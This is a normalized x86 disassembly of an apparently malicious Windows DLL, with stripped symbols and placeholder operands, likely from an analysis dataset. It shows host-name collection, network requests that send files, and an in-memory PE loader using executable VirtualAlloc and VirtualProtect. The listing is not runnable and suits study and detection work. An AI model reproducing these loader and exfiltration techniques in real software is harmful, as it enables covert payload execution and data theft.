add ebx edx
push eax
push ebx
call sub_1000e630
mov ebx eax
add esp 0xc
test ebx ebx
jne r-xdata
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x9c ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xa0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0xa0 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000426d
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
lea eax [ esp + 0x1c ]
push rw-data
push eax
call sub_1000426d
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ esp + 0x14 ]
push esi
push ecx
push 0x1
push ebx
call sub_1000e910
push ebx
call sub_1000413e
push esi
call sub_100041bf
add esp 0x18
lea edx [ esp + 0x9c ]
lea eax [ esp + 0x1c ]
push 0x4
push edx
push eax
call [ MoveFileExA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10c
retn
push ebx
call sub_1000413e
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10c
retn
mov ecx [ esp + 0x14 ]
push esi
push ecx
push 0x1
push ebx
call sub_1000e910
push ebx
call sub_1000413e
push esi
call sub_100041bf
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10c
retn
push ebx
call sub_1000413e
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10c
retn
sub_1000e910
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
xor ebp ebp
xor edi edi
test esi esi
jle r-xdata
mov edx [ esp + 0x1c ]
push edx
call sub_10007829
add esp 0x4
mov eax ebp
pop edi
pop esi
pop ebp
retn
push ebx
mov ebx [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
push ecx
sub esi eax
push eax
lea eax [ edi + edx ]
push ebx
push eax
call sub_10011a20
mov ecx eax
add esp 0x10
imul ecx ebx
add edi ecx
add ebp eax
test esi esi
jg r-xdata
mov eax 0x7530
cmp esi 0x7530
mov eax esi
jle r-xdata
pop ebx
sub_1000e970
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
xor ebp ebp
xor edi edi
test esi esi
jle r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
retn
push ebx
mov ebx [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
push ecx
sub esi eax
push eax
lea eax [ edi + edx ]
push ebx
push eax
call sub_10011b59
mov ecx eax
add esp 0x10
imul ecx ebx
add edi ecx
add ebp eax
test esi esi
jg r-xdata
mov eax 0x7530
cmp esi 0x7530
mov eax esi
jle r-xdata
pop ebx
pop edi
mov eax ebp
pop esi
pop ebp
retn
sub_1000e9d0
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ rw-data ]
cmp esi 0x1
je r-xdata
mov eax edi
mov [ rw-data ] esi
pop edi
pop esi
retn
cmp esi 0x2
jne r-xdata
cmp esi 0x3
jne r-xdata
push esi
jmp r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
push esi
call sub_1000fe10
add esp 0x4
sub_1000ea10
push esi
push edi
push 0x108
call sub_100049d2
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
xor eax eax
mov ecx 0x42
push eax
push eax
mov edi esi
push eax
push eax
push rw-data
[ edi ]
call sub_100100f0
test eax eax
mov [ esi ] eax
jne r-xdata
pop edi
pop esi
retn
mov edi [ esp + 0xc ]
push rw-data
push edi
call sub_1000409a
push rw-data
push 0x0
call sub_1000409a
add esp 0x10
test eax eax
jne r-xdata
push esi
call sub_1000413e
add esp 0x4
xor eax eax
pop edi
pop esi
retn
push eax
call sub_100050d7
add esp 0x4
mov eax 0x50
jmp r-xdata
mov edx [ esp + 0x10 ]
lea eax [ esi + 0x8 ]
push edx
push eax
call [ lstrcpyA@IAT ]
mov eax esi
pop edi
pop esi
retn
mov ecx [ esi ]
push ecx
call sub_10010280
push esi
call sub_1000413e
add esp 0x4
xor eax eax
pop edi
pop esi
retn
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push eax
mov eax [ esi ]
push edi
push eax
call sub_10010170
test eax eax
mov [ esi + 0x4 ] eax
jne r-xdata
sub_1000ead0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push eax
call sub_10010280
call sub_1000fe70
push esi
call sub_1000413e
add esp 0x4
push eax
call sub_10010280
sub_1000eb10
sub esp 0x204
push esi
push edi
mov ecx 0x80
xor eax eax
lea edi [ esp + 0x9 ]
mov [ esp + 0x8 ] 0x0
[ edi ]
stosb [ edi ]
mov eax [ esp + 0x210 ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x8 ]
push 0x200
push ecx
push rw-data
push eax
call sub_1000f050
add esp 0x10
test eax eax
jge r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0x204
retn
mov al [ esp + 0x8 ]
lea esi [ esp + 0x8 ]
test al al
je r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0x204
retn
pop edi
xor eax eax
pop esi
add esp 0x204
retn
push rw-data
push esi
call sub_10009d30
add esp 0x8
test eax eax
je r-xdata
pop edi
mov eax 0x1
pop esi
add esp 0x204
retn
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov al [ esi + ecx + 0x1 ]
lea esi [ esi + ecx + 0x1 ]
test al al
jne r-xdata
sub_1000ebc0
sub esp 0x80c
push esi
mov esi [ esp + 0x814 ]
push edi
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x411 ]
mov [ esp + 0x410 ] 0x0
[ edi ]
test esi esi
stosb [ edi ]
jne r-xdata
lea eax [ esi + 0x8 ]
lea ecx [ esp + 0x410 ]
push eax
push rw-data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
mov eax [ esi + 0x4 ]
lea edx [ esp + 0x410 ]
push 0x0
push 0x4400000
push 0x0
push 0x0
push 0x0
push edx
push rw-data
push eax
call sub_10010310
mov esi eax
test esi esi
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0x80c
retn
mov ecx [ esp + 0x820 ]
mov edx [ esp + 0x81c ]
push ebp
push ecx
push edx
push esi
xor ebp ebp
call sub_1000f4c0
add esp 0xc
test eax eax
jl r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0x80c
retn
push esi
call sub_10010280
or ebp 0xffffffff
mov eax ebp
pop ebp
pop edi
pop esi
add esp 0x80c
retn
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
stosb [ edi ]
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push eax
push 0x400
push ecx
push esi
call sub_10010930
test eax eax
je r-xdata
push esi
call sub_10010280
mov eax ebp
pop ebp
pop edi
pop esi
add esp 0x80c
retn
mov eax [ esp + 0xc ]
test eax eax
jbe r-xdata
push 0x4
lea edx [ esp + 0x14 ]
push rw-data
push edx
call sub_10012e70
add esp 0xc
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push eax
push 0x400
push ecx
push esi
call sub_10010930
test eax eax
jne r-xdata
or ebp 0xffffffff
sub_1000ed00
sub esp 0xc14
push esi
push edi
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
stosb [ edi ]
mov esi [ esp + 0xc20 ]
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x415 ]
mov [ esp + 0x414 ] 0x0
[ edi ]
test esi esi
stosb [ edi ]
jne r-xdata
mov edx [ esp + 0xc24 ]
test edx edx
je r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0xc14
retn
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x819 ]
mov [ esp + 0x818 ] 0x0
[ edi ]
stosb [ edi ]
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x818 ]
push eax
push ecx
mov [ esp + 0x14 ] 0x400
call [ GetComputerNameA@IAT ]
mov edx [ esp + 0xc28 ]
lea eax [ esp + 0x818 ]
push edx
lea ecx [ esi + 0x8 ]
push eax
push ecx
push rw-data
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call sub_10010440
test eax eax
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0xc14
retn
mov eax [ esp + 0xc28 ]
lea ecx [ esi + 0x8 ]
push eax
push edx
push ecx
push rw-data
jmp r-xdata
lea edx [ esp + 0x8 ]
push ebp
push edx
lea eax [ esp + 0x41c ]
push 0x400
push eax
push esi
xor edi edi
xor ebp ebp
call sub_10010930
test eax eax
je r-xdata
push esi
call sub_10010280
pop edi
or eax 0xffffffff
pop esi
add esp 0xc14
retn
lea edx [ esp + 0x20 ]
push edx
call [ wsprintfA@IAT ]
add esp 0x14
mov ecx [ esi + 0x4 ]
lea eax [ esp + 0x10 ]
push 0x0
push 0x4000000
push 0x0
push 0x0
push 0x0
push eax
push rw-data
push ecx
call sub_10010310
mov esi eax
test esi esi
jne r-xdata
push esi
call sub_10010280
mov eax ebp
pop ebp
pop edi
pop esi
add esp 0xc14
retn
mov eax [ esp + 0xc ]
test eax eax
jbe r-xdata
test edi edi
jne r-xdata
lea edx [ esp + 0xc ]
lea eax [ esp + 0x418 ]
push edx
push 0x400
push eax
push esi
inc edi
call sub_10010930
test eax eax
jne r-xdata
push 0x4
lea ecx [ esp + 0x41c ]
push rw-data
push ecx
call sub_10012e70
add esp 0xc
test eax eax
je r-xdata
or ebp 0xffffffff
sub_1000eeb0
sub esp 0xc14
push esi
push edi
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
stosb [ edi ]
mov esi [ esp + 0xc20 ]
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x415 ]
mov [ esp + 0x414 ] 0x0
[ edi ]
test esi esi
stosb [ edi ]
jne r-xdata
mov edx [ esp + 0xc24 ]
test edx edx
je r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0xc14
retn
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x819 ]
mov [ esp + 0x818 ] 0x0
[ edi ]
stosb [ edi ]
lea edx [ esp + 0xc ]
lea eax [ esp + 0x818 ]
push edx
push eax
mov [ esp + 0x14 ] 0x400
call [ GetComputerNameA@IAT ]
lea ecx [ esp + 0x818 ]
lea edx [ esi + 0x8 ]
push ecx
push edx
lea eax [ esp + 0x18 ]
push rw-data
push eax
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call sub_10010440
test eax eax
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
add esp 0xc14
retn
lea eax [ esi + 0x8 ]
push edx
push eax
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
jmp r-xdata
lea eax [ esp + 0x8 ]
push ebp
push eax
lea ecx [ esp + 0x41c ]
push 0x400
push ecx
push esi
xor edi edi
xor ebp ebp
call sub_10010930
test eax eax
je r-xdata
push esi
call sub_10010280
pop edi
or eax 0xffffffff
pop esi
add esp 0xc14
retn
call [ wsprintfA@IAT ]
add esp 0x10
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x10 ]
push 0x0
push 0x4000000
push 0x0
push 0x0
push 0x0
push ecx
push rw-data
push edx
call sub_10010310
mov esi eax
test esi esi
jne r-xdata
push esi
call sub_10010280
mov eax ebp
pop ebp
pop edi
pop esi
add esp 0xc14
retn
mov eax [ esp + 0xc ]
test eax eax
jbe r-xdata
test edi edi
jne r-xdata
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x418 ]
push eax
push 0x400
push ecx
push esi
inc edi
call sub_10010930
test eax eax
jne r-xdata
push 0x4
lea edx [ esp + 0x41c ]
push rw-data
push edx
call sub_10012e70
add esp 0xc
test eax eax
je r-xdata
or ebp 0xffffffff
sub_1000f050
sub esp 0xc14
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x19 ]
mov [ esp + 0x18 ] bl
mov esi [ esp + 0xc28 ]
[ edi ]
stosb [ edi ]
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x41d ]
mov [ esp + 0x41c ] bl
[ edi ]
cmp esi ebx
stosb [ edi ]
jne r-xdata
mov edx [ esp + 0xc2c ]
cmp edx ebx
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xc14
retn
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x821 ]
mov [ esp + 0x820 ] bl
[ edi ]
stosb [ edi ]
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x820 ]
push edx
push eax
mov [ esp + 0x18 ] 0x400
call [ GetComputerNameA@IAT ]
lea ecx [ esp + 0x820 ]
lea edx [ esi + 0x8 ]
push ecx
push edx
lea eax [ esp + 0x20 ]
push rw-data
push eax
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push edi
call sub_10010440
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xc14
retn
lea eax [ esi + 0x8 ]
push edx
push eax
lea ecx [ esp + 0x20 ]
push rw-data
push ecx
jmp r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x41c ]
push eax
push 0x400
push ecx
push edi
xor esi esi
xor ebp ebp
call sub_10010930
mov edi [ esp + 0xc30 ]
test eax eax
je r-xdata
push edi
call sub_10010280
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xc14
retn
call [ wsprintfA@IAT ]
add esp 0x10
mov edx [ esi + 0x4 ]
lea ecx [ esp + 0x18 ]
push ebx
push 0x4000000
push ebx
push ebx
push ebx
push ecx
push rw-data
push edx
call sub_10010310
mov edi eax
cmp edi ebx
mov [ esp + 0x10 ] edi
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ esi + edi ] bl
push eax
call sub_10010280
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc14
retn
mov edx [ esp + 0x14 ]
cmp edx ebx
jbe r-xdata
cmp ebp 0x1
je r-xdata
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x420 ]
push 0x400
push eax
push ecx
call sub_10010930
test eax eax
jne r-xdata
xor ecx ecx
cmp edx ebx
jle r-xdata
mov al [ esp + ecx + 0x41c ]
cmp al 0xd
je r-xdata
cmp esi ebx
je r-xdata
cmp al 0xa
je r-xdata
inc ecx
cmp ecx edx
jl r-xdata
cmp [ esi + edi - 0x1 ] bl
je r-xdata
mov [ esi + edi ] al
jmp r-xdata
jmp r-xdata
mov [ esi + edi ] bl
mov al [ esi + edi - 0x1 ]
cmp al 0x20
jne r-xdata
mov eax [ esp + 0xc34 ]
inc esi
cmp esi eax
jge r-xdata
cmp [ esi + edi - 0x2 ] bl
jne r-xdata
mov al [ esi + edi - 0x1 ]
dec esi
cmp al bl
je r-xdata
mov [ esi + edi - 0x1 ] bl
mov ebp 0x1
inc esi
mov ebp 0x1
mov [ esi + edi ] bl
inc esi
dec esi
js r-xdata
cmp [ esi + edi ] bl
jne r-xdata
cmp [ esi + edi ] bl
jne r-xdata
mov edx [ esp + 0x10 ]
push edx
call sub_10010280
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xc14
retn
sub_1000f280
sub esp 0x408
push ebx
push esi
mov ebx [ esp + 0x414 ]
push edi
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
test ebx ebx
stosb [ edi ]
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
add esp 0x408
retn
mov esi [ esp + 0x420 ]
push rw-data
push esi
call sub_1000426d
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov eax [ esp + 0x41c ]
mov ecx [ ebx + 0x4 ]
push 0x0
push 0x4000000
push 0x0
push 0x0
push 0x0
push eax
push rw-data
push ecx
call sub_10010310
mov ebx eax
test ebx ebx
je r-xdata
push edi
call sub_100041bf
push esi
call sub_10004070
add esp 0x8
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
call sub_10010440
test eax eax
jne r-xdata
lea edx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push edx
push 0x400
push eax
push ebx
xor esi esi
call sub_10010930
test eax eax
je r-xdata
push ebx
call sub_10010280
push ebx
call sub_10010280
push edi
call sub_100041bf
add esp 0x4
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x408
retn
mov eax [ esp + 0xc ]
test eax eax
jbe r-xdata
cmp esi 0x400
jle r-xdata
push edi
push eax
lea ecx [ esp + 0x18 ]
push 0x1
push ecx
call sub_10011a20
push edi
call sub_10007829
mov ecx [ esp + 0x20 ]
add esp 0x14
lea edx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push edx
push 0x400
push eax
push ebx
add esi ecx
call sub_10010930
test eax eax
jne r-xdata
push ebx
call sub_10010250
add esp 0x4
sub_1000f3b0
mov eax [ esp + 0x4 ]
push ebx
test eax eax
push edi
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ eax + 0x4 ]
push 0x0
push 0x4000000
push 0x0
push 0x0
push 0x0
push ecx
push rw-data
push edx
call sub_10010310
mov edi eax
test edi edi
jne r-xdata
pop edi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push edi
call sub_10010440
test eax eax
jne r-xdata
pop edi
pop ebx
retn
lea eax [ esp + 0x10 ]
push 0x0
lea ecx [ esp + 0x10 ]
push eax
push ecx
push 0x20000005
push edi
mov [ esp + 0x24 ] 0x4
call sub_10010e10
test eax eax
jne r-xdata
push edi
call sub_10010280
pop edi
xor eax eax
pop ebx
retn
mov edx [ esp + 0xc ]
push edx
call sub_100049d2
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
push edi
call sub_10010280
pop edi
xor eax eax
pop ebx
retn
mov ecx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push esi
push eax
push ecx
push ebx
push edi
xor esi esi
call sub_10010930
test eax eax
je r-xdata
push edi
call sub_10010280
pop edi
xor eax eax
pop ebx
retn
mov eax [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
test eax eax
jbe r-xdata
push edi
call sub_10010280
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0xc ]
mov eax ebx
pop edi
mov [ ecx ] edx
pop ebx
retn
push edi
call sub_10010250
add esp 0x4
add esi eax
mov eax [ esp + 0x10 ]
cmp esi eax
jge r-xdata
cmp eax 0x400
pop esi
jbe r-xdata
lea edx [ esp + 0x14 ]
sub eax esi
push edx
push eax
lea eax [ esi + ebx ]
push eax
push edi
call sub_10010930
test eax eax
jne r-xdata
sub_1000f4c0
sub esp 0xec4
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x2d1 ]
mov [ esp + 0x2d0 ] bl
mov esi [ wsprintfA@IAT ]
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x1d0 ]
push rw-data
push eax
call esi
mov edx [ esp + 0xee0 ]
add esp 0x8
lea ecx [ esp + 0x1d0 ]
push 0xa0000000
push 0xffffffff
push ecx
push edx
call sub_10010b60
test eax eax
jne r-xdata
mov edx [ esp + 0xedc ]
cmp edx ebx
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xec4
retn
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0xd0 ]
push ecx
push edx
mov [ esp + 0x28 ] 0x100
call [ GetComputerNameA@IAT ]
lea eax [ esp + 0xd0 ]
lea ecx [ esp + 0x6d4 ]
push eax
push rw-data
push ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
lea edi [ esp + 0x6d4 ]
or ecx 0xffffffff
xor eax eax
push ebx
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0xad8 ]
mov [ esp + 0x20 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x54 ]
mov [ esp + 0x18 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ebp
mov edi ecx
mov [ esp + 0x2c ] edi
call [ GetFileSize@IAT ]
mov esi eax
mov eax [ esp + 0x14 ]
add esi edi
mov edi [ esp + 0x1c ]
add esi eax
push ebx
add esi edi
mov edi [ esp + 0xedc ]
push ebx
lea ecx [ esp + 0x30 ]
push ebx
push ecx
push edi
mov [ esp + 0x3c ] 0x28
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x58 ] esi
mov [ esp + 0x5c ] ebx
mov [ esp + 0x60 ] ebx
call sub_100106a0
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
add esp 0xec4
retn
push edx
lea eax [ esp + 0x6d8 ]
push rw-data
push eax
jmp r-xdata
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x6d8 ]
push eax
push ecx
push edi
call sub_10010b00
test eax eax
jne r-xdata
push ebp
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
add esp 0xec4
retn
call esi
mov edi [ esp + 0xeec ]
add esp 0xc
lea edx [ esp + 0xad4 ]
push edi
push rw-data
push edx
call esi
lea eax [ esp + 0x5c ]
push rw-data
push eax
call esi
add esp 0x14
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0x80000000
push edi
call [ CreateFileA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xad8 ]
push eax
push ecx
push edi
call sub_10010b00
test eax eax
jne r-xdata
push ebp
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
mov eax 0xfffffffc
pop ebx
add esp 0xec4
retn
lea edx [ esp + 0x18 ]
push ebx
push edx
lea eax [ esp + 0x2d8 ]
push 0x400
push eax
push ebp
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push ebp
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
mov eax 0xfffffffb
pop ebx
add esp 0xec4
retn
push ebp
call [ CloseHandle@IAT ]
mov eax [ esp + 0x24 ]
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0x54 ]
push eax
push ecx
push edi
call sub_10010b00
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push edi
call sub_10010c00
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffff9
pop ebx
add esp 0xec4
retn
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x2d0 ]
push ecx
push eax
push edx
push edi
call sub_10010b00
test eax eax
je r-xdata
cmp esi 0x400
jbe r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffff8
pop ebx
add esp 0xec4
retn
push ebp
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
mov eax 0xfffffffa
pop ebx
add esp 0xec4
retn
lea eax [ esp + 0x18 ]
push ebx
push eax
lea ecx [ esp + 0x2d8 ]
push 0x400
push ecx
push ebp
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xec4
retn
push edi
call sub_10010250
add esp 0x4
sub_1000f7d0
push ecx
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
cmp [ eax ] 0x5a4d
push edi
je r-xdata
mov edi [ eax + 0x3c ]
add edi eax
mov [ esp + 0x10 ] edi
cmp [ edi ] 0x4550
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ edi + 0x50 ]
mov ecx [ edi + 0x34 ]
mov esi [ VirtualAlloc@IAT ]
push 0x40
push 0x2000
push eax
push ecx
call esi
mov ebp eax
test ebp ebp
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push 0x14
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
xor eax eax
push 0x40
push 0x1000
mov [ ebx + 0x4 ] ebp
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] eax
mov [ ebx + 0x10 ] eax
mov eax [ edi + 0x50 ]
push eax
push ebp
call esi
mov ecx [ edi + 0x54 ]
push 0x40
push 0x1000
push ecx
push ebp
call esi
mov esi [ esp + 0x18 ]
mov edx [ edi + 0x54 ]
mov edi eax
push ebx
mov ecx [ esi + 0x3c ]
add ecx edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x14 ]
push esi
push ecx
mov edx [ ecx + 0x3c ]
add eax edx
mov [ ebx ] eax
mov [ eax + 0x34 ] ebp
call sub_1000f920
mov ecx [ esi + 0x34 ]
mov eax ebp
add esp 0xc
sub eax ecx
je r-xdata
mov edx [ edi + 0x50 ]
push 0x40
push 0x2000
push edx
push eax
call esi
mov ebp eax
test ebp ebp
jne r-xdata
push ebx
call sub_1000fb30
add esp 0x4
test eax eax
je r-xdata
push eax
push ebx
call sub_1000fab0
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push ebx
call sub_1000fcf0
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push ebx
call sub_1000f9f0
mov eax [ ebx ]
add esp 0x4
mov eax [ eax + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
pop ecx
retn
add eax ebp
test eax eax
je r-xdata
push 0x0
push 0x1
push ebp
call eax
test eax eax
jne r-xdata
mov [ ebx + 0x10 ] 0x1
sub_1000f920
push ecx
mov eax [ esp + 0x10 ]
push ebx
push ebp
xor ecx ecx
mov ebp [ eax + 0x4 ]
mov eax [ eax ]
mov [ esp + 0x8 ] 0x0
mov cx [ eax + 0x14 ]
cmp [ eax + 0x6 ] 0x0
lea ebx [ ecx + eax + 0x18 ]
jbe r-xdata
pop ebp
pop ebx
pop ecx
retn
push esi
push edi
add ebx 0x10
mov ecx [ ebx - 0x4 ]
mov eax [ ebx ]
push 0x4
push 0x1000
add ecx ebp
push eax
push ecx
call [ VirtualAlloc@IAT ]
mov ecx [ ebx ]
mov esi [ ebx + 0x4 ]
mov edi [ esp + 0x18 ]
mov edx ecx
add esi edi
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov [ ebx - 0x8 ] eax
mov edx [ esp + 0x1c ]
mov esi [ edx + 0x38 ]
test esi esi
jle r-xdata
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x10 ]
inc eax
add ebx 0x28
mov edx [ ecx ]
xor ecx ecx
mov [ esp + 0x10 ] eax
mov cx [ edx + 0x6 ]
cmp eax ecx
jl r-xdata
mov eax [ ebx - 0x4 ]
push 0x4
push 0x1000
add eax ebp
push esi
push eax
call [ VirtualAlloc@IAT ]
mov ecx esi
mov edi eax
mov edx ecx
xor eax eax
shr ecx 0x2
mov [ ebx - 0x8 ] edi
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
jmp r-xdata
sub_1000f9f0
push ecx
mov eax [ esp + 0x8 ]
push ebx
xor ecx ecx
push ebp
mov ebx [ eax ]
xor ebp ebp
mov cx [ ebx + 0x14 ]
cmp [ ebx + 0x6 ] bp
lea eax [ ecx + ebx + 0x18 ]
jbe r-xdata
pop ebp
pop ebx
pop ecx
retn
push esi
push edi
lea edi [ eax + 0x24 ]
lea ecx [ edx + ecx * 2 ]
test eax 0x4000000
lea edx [ esi + ecx * 2 ]
mov esi [ edx * 4 + rw-data ]
je r-xdata
mov edx [ edi - 0x14 ]
mov eax [ edi - 0x1c ]
push 0x4000
push edx
push eax
call [ VirtualFree@IAT ]
jmp r-xdata
mov edx [ edi - 0x14 ]
mov ecx edx
test ecx ecx
jne r-xdata
or esi 0x200
mov edx [ esp + 0x18 ]
xor eax eax
inc ebp
add edi 0x28
mov ebx [ edx ]
mov ax [ ebx + 0x6 ]
cmp ebp eax
jl r-xdata
jbe r-xdata
test al 0x40
je r-xdata
mov eax [ edi ]
mov ecx eax
mov edx eax
shr ecx 0x1d
shr edx 0x1e
mov esi eax
and ecx 0x1
and edx 0x1
shr esi 0x1f
test eax 0x2000000
je r-xdata
pop edi
pop esi
mov ecx [ edi - 0x1c ]
lea eax [ esp + 0x10 ]
push eax
push esi
push edx
push ecx
call [ VirtualProtect@IAT ]
test al 0x80
